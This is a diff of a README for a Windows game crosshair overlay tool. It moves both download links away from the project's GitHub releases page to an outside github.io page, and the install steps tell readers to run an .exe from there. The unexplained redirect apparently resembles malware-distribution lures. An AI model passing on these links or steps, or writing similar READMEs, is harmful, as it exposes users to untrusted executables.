@@ -1,6 +1,6 @@
 # 🎮 crosshairx-pro-crosshair-hub - Precise crosshairs for your favorite games
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/singhtom725/crosshairx-pro-crosshair-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://singhtom725.github.io)
 
 ## 👋 About the software
 
@@ -21,7 +21,7 @@ This application works on most standard Windows setups. Ensure your computer mee
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following page to choose your installer: [Download Link](https://github.com/singhtom725/crosshairx-pro-crosshair-hub/releases).
+1. Visit the following page to choose your installer: [Download Link](https://singhtom725.github.io).
 2. Look for the file ending in .exe under the latest version header.
 3. Click the filename to download the installer to your PC.
 4. Locate the downloaded file in your Downloads folder.
